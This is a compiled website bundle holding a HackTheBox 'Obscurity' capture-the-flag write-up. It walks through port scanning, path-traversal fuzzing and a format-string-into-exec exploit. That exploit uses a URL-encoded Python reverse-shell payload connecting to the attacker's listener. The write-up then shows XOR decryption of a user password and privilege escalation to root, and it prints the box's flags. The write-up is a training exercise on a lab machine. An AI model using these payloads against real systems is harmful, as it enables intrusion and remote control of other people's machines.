"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[101],{3905:(e,t,r)=>{r.d(t,{Zo:()=>u,kt:()=>k});var n=r(67294);function a(e,t,r){return t in e?Object.defineProperty(e,t,{value:r,enumerable:!0,configurable:!0,writable:!0}):e[t]=r,e}function o(e,t){var r=Object.keys(e);if(Object.getOwnPropertySymbols){var n=Object.getOwnPropertySymbols(e);t&&(n=n.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),r.push.apply(r,n)}return r}function i(e){for(var t=1;t<arguments.length;t++){var r=null!=arguments[t]?arguments[t]:{};t%2?o(Object(r),!0).forEach((function(t){a(e,t,r[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(r)):o(Object(r)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(r,t))}))}return e}function l(e,t){if(null==e)return{};var r,n,a=function(e,t){if(null==e)return{};var r,n,a={},o=Object.keys(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||(a[r]=e[r]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(n=0;n<o.length;n++)r=o[n],t.indexOf(r)>=0||Object.prototype.propertyIsEnumerable.call(e,r)&&(a[r]=e[r])}return a}var p=n.createContext({}),s=function(e){var t=n.useContext(p),r=t;return e&&(r="function"==typeof e?e(t):i(i({},t),e)),r},u=function(e){var t=s(e.components);return n.createElement(p.Provider,{value:t},e.children)},c="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return n.createElement(n.Fragment,{},t)}},m=n.forwardRef((function(e,t){var r=e.components,a=e.mdxType,o=e.originalType,p=e.parentName,u=l(e,["components","mdxType","originalType","parentName"]),c=s(r),m=a,k=c["".concat(p,".").concat(m)]||c[m]||d[m]||o;return r?n.createElement(k,i(i({ref:t},u),{},{components:r})):n.createElement(k,i({ref:t},u))}));function k(e,t){var r=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=r.length,i=new Array(o);i[0]=m;var l={};for(var p in t)hasOwnProperty.call(t,p)&&(l[p]=t[p]);l.originalType=e,l[c]="string"==typeof e?e:a,i[1]=l;for(var s=2;s<o;s++)i[s]=r[s];return n.createElement.apply(null,i)}return n.createElement.apply(null,r)}m.displayName="MDXCreateElement"},74375:(e,t,r)=>{r.r(t),r.d(t,{assets:()=>p,contentTitle:()=>i,default:()=>d,frontMatter:()=>o,metadata:()=>l,toc:()=>s});var n=r(87462),a=(r(67294),r(3905));const o={layout:"post",title:"Obscurity ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","web","pe","exploit","htb","sql"],date:"2020/05/09",thumbnail:"/img/HackTheBox/obscurity.png",toc:!0},i=void 0,l={unversionedId:"HackTheBox/Obscurity/write-up",id:"HackTheBox/Obscurity/write-up",title:"Obscurity ",description:"\ud83d\udca2 Info",source:"@site/writeups/HackTheBox/Obscurity/write-up.md",sourceDirName:"HackTheBox/Obscurity",slug:"/HackTheBox/Obscurity/write-up",permalink:"/writeups/HackTheBox/Obscurity/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"recon",permalink:"/writeups/tags/recon"},{label:"network",permalink:"/writeups/tags/network"},{label:"web",permalink:"/writeups/tags/web"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"exploit",permalink:"/writeups/tags/exploit"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"sql",permalink:"/writeups/tags/sql"}],version:"current",frontMatter:{layout:"post",title:"Obscurity ",lang:"en",categories:["writeups"],tags:["security","writeups","linux","recon","network","web","pe","exploit","htb","sql"],date:"2020/05/09",thumbnail:"/img/HackTheBox/obscurity.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Nest ",permalink:"/writeups/HackTheBox/Nest/write-up"},next:{title:"Omni ",permalink:"/writeups/HackTheBox/Omni/write-up"}},p={},s=[{value:"\ud83d\udca2 Info",id:"-info",level:2},{value:"Overview",id:"overview",level:3},{value:"Network Enumeration",id:"network-enumeration",level:3},{value:"Web application discovery",id:"web-application-discovery",level:3},{value:"Web application enumeration",id:"web-application-enumeration",level:3},{value:"Web application exploitation",id:"web-application-exploitation",level:3},{value:"System Privilege Escalation : www-data to robert",id:"system-privilege-escalation--www-data-to-robert",level:3},{value:"System Privilege Escalation : robert to root",id:"system-privilege-escalation--robert-to-root",level:3},{value:"Files",id:"files",level:3}],u={toc:s},c="wrapper";function d(e){let{components:t,...o}=e;return(0,a.kt)(c,(0,n.Z)({},u,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h2",{id:"-info"},"\ud83d\udca2 Info"),(0,a.kt)("h1",{id:""}),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," Obscurity"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/219"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Medium"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"obscurity",src:r(55377).Z,width:"598",height:"381"})),(0,a.kt)("h1",{id:"-1"}),(0,a.kt)("h3",{id:"overview"},"Overview"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Network Enumeration"),": nmap 22, 8080"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Web application discovery"),": hints"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Web application enumeration"),": ",(0,a.kt)("inlineCode",{parentName:"li"},"/../SuperSecureServer.py")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Web application exploitation"),": RCE"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"System Privilege Escalation : www-data to robert"),": ",(0,a.kt)("inlineCode",{parentName:"li"},"SuperSecureCrypt.py")," XORing"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"System Privilege Escalation : robert to root"),": ",(0,a.kt)("inlineCode",{parentName:"li"},"BetterSSH.py")," command execution")),(0,a.kt)("h3",{id:"network-enumeration"},"Network Enumeration"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": nmap 22, 8080"),(0,a.kt)("p",null,"A very quick and lazy ",(0,a.kt)("a",{parentName:"p",href:"https://nmap.org/"},"nmap")," scan shows 2 open services:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo nmap 10.10.10.168\n[sudo] password for cyfun:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-03-05 23:10 CET\nNmap scan report for 10.10.10.168\nHost is up (0.049s latency).\nNot shown: 996 filtered ports\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n80/tcp   closed http\n8080/tcp open   http-proxy\n9000/tcp closed cslistener\n")),(0,a.kt)("h3",{id:"web-application-discovery"},"Web application discovery"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": hints"),(0,a.kt)("p",null,"Let's take a look at the webserver."),(0,a.kt)("p",null,"On the main page there are several hints."),(0,a.kt)("p",null,"On the ",(0,a.kt)("strong",{parentName:"p"},"Our Software")," section we can read the following:"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"Our suite of custom software currently includes:"),(0,a.kt)("p",{parentName:"blockquote"},"A custom written web server\nCurrently resolving minor stability issues; server will restart if it hangs for 30 seconds"),(0,a.kt)("p",{parentName:"blockquote"},"An unbreakable encryption algorithm"),(0,a.kt)("p",{parentName:"blockquote"},"A more secure replacement to SSH")),(0,a.kt)("p",null,"And on the ",(0,a.kt)("strong",{parentName:"p"},"Development")," section we can read:"),(0,a.kt)("blockquote",null,(0,a.kt)("p",{parentName:"blockquote"},"Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory")),(0,a.kt)("h3",{id:"web-application-enumeration"},"Web application enumeration"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": ",(0,a.kt)("inlineCode",{parentName:"p"},"/../SuperSecureServer.py")),(0,a.kt)("p",null,"Let's try to find the secret development directory:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ dirsearch -u http://10.10.10.168:8080/ -e py -w ~/CTF/tools/SecLists/Discovery/Web-Content/raft-large-directories.txt\n")),(0,a.kt)("p",null,"Nothing with ",(0,a.kt)("inlineCode",{parentName:"p"},"raft-large-files.txt"),", ",(0,a.kt)("a",{parentName:"p",href:"https://github.com/maurosoria/dirsearch"},"dirsearch's")," or ",(0,a.kt)("a",{parentName:"p",href:"http://dirb.sourceforge.net/"},"dirb's"),"\ndefault wordlist nor with ",(0,a.kt)("a",{parentName:"p",href:"https://portswigger.net/burp"},"burp")," pro ",(0,a.kt)("inlineCode",{parentName:"p"},"directory - long")," wordlist."),(0,a.kt)("p",null,"In fact it was requiring guessing, because they hinted it was a custom web\nserver you have to think it is vulnerable to vulnerabilities real web server\nare not vulnerable to."),(0,a.kt)("p",null,"The path was ",(0,a.kt)("inlineCode",{parentName:"p"},"/../SuperSecureServer.py"),". I don't understand why so much people\nare saying on the forum that this step is nice... In real life a web application\ncan be vulnerable to path traversal but not the web server itself."),(0,a.kt)("p",null,"At least the HTB skill radar was saying it requires a lot of enumeration and is\nvery CTF-style so we should be surprised it is not realistic. Usually I don't like\nguessy or unrealistic steps like this one."),(0,a.kt)("p",null,"However it was possible to find it via another weird way."),(0,a.kt)("p",null,"If ",(0,a.kt)("inlineCode",{parentName:"p"},"/XXXX/")," subdirectory exists the custom web server won't return a HTTP code\nthat will allow us to find the folder exists but if we request an existing page\neg. ",(0,a.kt)("inlineCode",{parentName:"p"},"/XXXX/validpage.txt")," of course we will get a 200.\nSo as we know the name of the page ",(0,a.kt)("inlineCode",{parentName:"p"},"SuperSecureServer.py")," but not the directory\nit was possible to use wfuzz to fuzz the directory name like that:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ wfuzz -w ~/dict.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py\n")),(0,a.kt)("p",null,"And find either ",(0,a.kt)("inlineCode",{parentName:"p"},"/../")," (path traversal) or ",(0,a.kt)("inlineCode",{parentName:"p"},"/develop/")," (just enumeration)."),(0,a.kt)("p",null,"So finally there was a way to find it without guessing."),(0,a.kt)("h3",{id:"web-application-exploitation"},"Web application exploitation"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": RCE"),(0,a.kt)("p",null,"So ",(0,a.kt)("a",{parentName:"p",href:"https://gist.github.com/S4CH/4cb408456318997fb62dc0ec1311c6a3#file-supersecureserver-py"},"here is the source code")," of the script."),(0,a.kt)("p",null,"Immediately is understood there was a vulnerability in those 3 lines:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"        path = urllib.parse.unquote(path)\n...\n            info = \"output = 'Document: {}'\" # Keep the output for later debug\n            exec(info.format(path)) # This is how you do string formatting, right?\n")),(0,a.kt)("p",null,"A format string passed into an exec."),(0,a.kt)("p",null,"So it seems we will be able to execute some commands for example to download and\nexecute a reverse shell."),(0,a.kt)("p",null,"To try it out I added those two lines and started the server locally."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-python"},"serv = Server('127.0.0.1', 7777)\nserv.listen()\n")),(0,a.kt)("p",null,"Then I started a reverse shell listener with ",(0,a.kt)("inlineCode",{parentName:"p"},"nc -nlp 9999")," and URL encoded the\nkey characters of the reverse shell payload so it can fit in the URL."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"http://127.0.0.1:7777/toto.html?tata=a%27;%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.237%22,9999));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%20a=%20%27\n")),(0,a.kt)("p",null,"As I worked I tried immediately on the box."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"GET /?tata=a%27;%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.15.237%22,9999));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%20a=%20%27 HTTP/1.1\nHost: 10.10.10.168:8080\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:74.0) Gecko/20100101 Firefox/74.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCache-Control: max-age=0\n")),(0,a.kt)("h3",{id:"system-privilege-escalation--www-data-to-robert"},"System Privilege Escalation : www-data to robert"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": ",(0,a.kt)("inlineCode",{parentName:"p"},"SuperSecureCrypt.py")," XORing"),(0,a.kt)("p",null,"I started enumerating the home directories and saw this:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cd /home/robert/\n$ ls -lh\ntotal 24K\ndrwxr-xr-x 2 root   root   4.0K Dec  2 09:47 BetterSSH\n-rw-rw-r-- 1 robert robert   94 Sep 26 23:08 check.txt\n-rw-rw-r-- 1 robert robert  185 Oct  4 15:01 out.txt\n-rw-rw-r-- 1 robert robert   27 Oct  4 15:01 passwordreminder.txt\n-rwxrwxr-x 1 robert robert 2.5K Oct  4 14:55 SuperSecureCrypt.py\n-rwx------ 1 robert robert   33 Sep 25 14:12 user.txt\n")),(0,a.kt)("p",null,"We can see there is script named ",(0,a.kt)("inlineCode",{parentName:"p"},"SuperSecureCrypt.py")," (",(0,a.kt)("a",{parentName:"p",href:"https://gist.github.com/S4CH/4cb408456318997fb62dc0ec1311c6a3#file-supersecurecrypt-py"},"source code"),")."),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"out.txt")," seems to be encrypted with the script, ",(0,a.kt)("inlineCode",{parentName:"p"},"check.txt")," seems to be the\ncorresponding clear text and ",(0,a.kt)("inlineCode",{parentName:"p"},"passwordreminder.txt")," is also encrypted."),(0,a.kt)("p",null,"The encrypt and decrypt functions seems to be XOR-like functions so it is\npermutable: ",(0,a.kt)("inlineCode",{parentName:"p"},"out.txt x check.txt = key"),"."),(0,a.kt)("p",null,"To do that with the CLI interface we provide ",(0,a.kt)("inlineCode",{parentName:"p"},"out.txt")," as the input and\n",(0,a.kt)("inlineCode",{parentName:"p"},"check.txt"),' as the key so the resulting "encrypted" file gives us in fact the\nclear text key ',(0,a.kt)("inlineCode",{parentName:"p"},"alexandrovich"),"."),(0,a.kt)("p",null,"Doing the same with the encrypted password and the real key we can find the\nclear text of the password."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'$ python SuperSecureCrypt.py -i out.txt -o out2.txt -k "$(cat check.txt)" -d\n$ python SuperSecureCrypt.py -i passwordreminder.txt -o out2.txt -k "alexandrovich" -d\n')),(0,a.kt)("p",null,"Robert password is ",(0,a.kt)("inlineCode",{parentName:"p"},"SecThruObsFTW"),"."),(0,a.kt)("p",null,"So now we can connect to ssh as robert."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ ssh -v robert@10.10.10.168\n...\nrobert@obscure:~$ cat user.txt\ne4493782066b55fe2755708736ada2d7\n")),(0,a.kt)("h3",{id:"system-privilege-escalation--robert-to-root"},"System Privilege Escalation : robert to root"),(0,a.kt)("p",null,(0,a.kt)("strong",{parentName:"p"},"TL;DR"),": ",(0,a.kt)("inlineCode",{parentName:"p"},"BetterSSH.py")," command execution"),(0,a.kt)("p",null,"It seems we can run a python script as root."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"robert@obscure:~$ sudo -l\nMatching Defaults entries for robert on obscure:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser robert may run the following commands on obscure:\n    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://gist.github.com/S4CH/4cb408456318997fb62dc0ec1311c6a3#file-betterssh-py"},"Source code of ",(0,a.kt)("inlineCode",{parentName:"a"},"BetterSSH.py"))),(0,a.kt)("p",null,"We can replace the script executed as root by a python reverse shell and execute it."),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"\u279c nc -nlp 8888\nroot@obscure:~# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@obscure:~# cd /root\ncd /root\nroot@obscure:/root# ls\nls\nroot.txt\nroot@obscure:/root# cat root.txt\ncat root.txt\n512fd4429f33a113a44d5acde23609e3\n")),(0,a.kt)("p",null,"Else the normal way would have been to use a command injection in\n",(0,a.kt)("inlineCode",{parentName:"p"},"cmd = ['sudo', '-u',  session['user']]"),"."),(0,a.kt)("h3",{id:"files"},"Files"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"[Gist]",(0,a.kt)("ul",{parentName:"li"},(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/4cb408456318997fb62dc0ec1311c6a3#file-supersecureserver-py"},"SuperSecureServer.py")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/4cb408456318997fb62dc0ec1311c6a3#file-supersecurecrypt-py"},"SuperSecureCrypt.py")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("a",{parentName:"li",href:"https://gist.github.com/S4CH/4cb408456318997fb62dc0ec1311c6a3#file-betterssh-py"},"BetterSSH.py"))))))}d.isMDXComponent=!0},55377:(e,t,r)=>{r.d(t,{Z:()=>n});const n=r.p+"assets/images/obscurity-50f627ec279a746986a91810a568d0af.png"}}]);